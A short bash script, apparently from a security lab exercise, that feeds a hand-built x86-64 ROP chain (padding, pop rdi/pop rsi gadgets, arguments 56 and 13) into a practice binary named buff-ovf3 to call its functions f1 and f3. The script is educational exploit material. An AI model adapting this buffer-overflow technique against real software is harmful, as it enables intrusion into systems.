#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause

# x86-64 ROP chain exploit
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*18 +                                    # padding
    b"\xdd\x13\x40\x00\x00\x00\x00\x00" +       # pop rdi; ret
    b"\x38\x00\x00\x00\x00\x00\x00\x00" +       # 56 (first param for f1)
    b"\xea\x13\x40\x00\x00\x00\x00\x00" +       # pop rsi; ret
    b"\x0d\x00\x00\x00\x00\x00\x00\x00" +       # 13 (second param for f1)
    b"\x6c\x13\x40\x00\x00\x00\x00\x00" +       # f1 address
    b"\xdd\x13\x40\x00\x00\x00\x00\x00" +       # pop rdi; ret
    b"\x0d\x00\x00\x00\x00\x00\x00\x00" +       # 13 (param for f3)
    b"\x16\x13\x40\x00\x00\x00\x00\x00"         # f3 address
)' | ../support/buff-ovf3
